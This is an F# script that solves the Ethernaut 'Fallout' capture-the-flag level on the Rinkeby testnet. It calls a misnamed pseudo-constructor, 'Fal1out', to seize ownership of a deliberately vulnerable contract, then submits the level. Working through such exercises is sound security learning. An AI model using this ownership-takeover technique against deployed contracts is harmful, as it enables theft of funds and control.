#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.4.3" 


open web3.fs

// Values and partial applications
let digest = newKeccakDigest
let web3c = createWeb3Connection "http://127.0.0.1:1248" "2.0"
let constants = createDefaultConstants "0x2268b96e204379ee8366505c344ebe5cc34d3a46"
let monitor = createReceiptMonitor web3c

let call = makeEthCall web3c constants
let txn = makeEthTxn web3c constants

let ethernautContractAddress = "0xD991431D8b033ddCb84dAD257f4821E9d5b38C33"
let ethernautABI = """[{"inputs":[{"internalType":"contractLevel","name":"_level","type":"address"}],"name":"createLevelInstance","outputs":[],"stateMutability":"payable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"player","type":"address"},{"indexed":false,"internalType":"contractLevel","name":"level","type":"address"}],"name":"LevelCompletedLog","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"player","type":"address"},{"indexed":false,"internalType":"address","name":"instance","type":"address"}],"name":"LevelInstanceCreatedLog","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[{"internalType":"contractLevel","name":"_level","type":"address"}],"name":"registerLevel","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"addresspayable","name":"_instance","type":"address"}],"name":"submitLevelInstance","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]""" |> ABI

// Load up our contract, set deeper partials
let deployedEthernaut = loadDeployedContract digest ethernautContractAddress RINKEBY ethernautABI |> bindDeployedContract |> List.head
let callEthernaut = call deployedEthernaut
let txnEthernaut = txn deployedEthernaut


// Get a level instance, you pass in the address of ( I guess) the base or prototype of the contract, and you
// get a copy, logged via the Event emitted inside `createLevelInstance` 
txnEthernaut (ByString "createLevelInstance") [Address "0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5"] "0"
|> monitorTransaction monitor
|> ignore

// deployed to 0x7ae439229d9bc8df3309176fe1be6ab883d35666

let level2ABI = """[{"inputs":[],"name":"Fal1out","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"allocate","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"allocator","type":"address"}],"name":"allocatorBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"collectAllocations","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"addresspayable","name":"allocator","type":"address"}],"name":"sendAllocation","outputs":[],"stateMutability":"nonpayable","type":"function"}]""" |> ABI
let level2 = loadDeployedContract digest "0x7ae439229d9bc8df3309176fe1be6ab883d35666" RINKEBY level2ABI |> bindDeployedContract |> List.head

//partials
let callLevel2 = makeEthCall web3c constants level2 
let txnLevel2 = makeEthTxn web3c constants level2


level2.functions
|> List.iter(fun p -> printfn $"functions: {p.name}, {p.hash}, {p.canonicalInputs}, {p.config}")
//functions: Fal1out, EVMFunctionHash "0x6fab5ddf", EVMFunctionInputs "()", Payable
//functions: allocate, EVMFunctionHash "0xabaa9916", EVMFunctionInputs "()", Payable
//functions: allocatorBalance, EVMFunctionHash "0xffd40b56", EVMFunctionInputs "(address)", View
//functions: collectAllocations, EVMFunctionHash "0x8aa96f38", EVMFunctionInputs "()", Nonpayable
//functions: owner, EVMFunctionHash "0x8da5cb5b", EVMFunctionInputs "()", View
//functions: sendAllocation, EVMFunctionHash "0xa2dea26f", EVMFunctionInputs "(address)", Nonpayable
//functions: receive, EVMFunctionHash "0xa3e76c0f", EVMFunctionInputs "()", Payable

// Clear condition: claim ownership

// verify owner is not me
callLevel2 (ByString "owner") []
|> logCallResult

// Default uint256 value


// Well, the fal1out() function certainly looks suspicious. I know early versions of solidity automatically used 
// the function with the name of the contract as the constructor, but a 'constructor' comment doesn't make it so
txnLevel2 (ByString "Fal1out") [] "1000"
|> monitorTransaction monitor

// check owner afterwards
callLevel2 (ByString "owner") []
|> logCallResult

txnEthernaut (ByString "submitLevelInstance") [Address "0x7ae439229d9bc8df3309176fe1be6ab883d35666"] ZEROV
|> monitorTransaction monitor
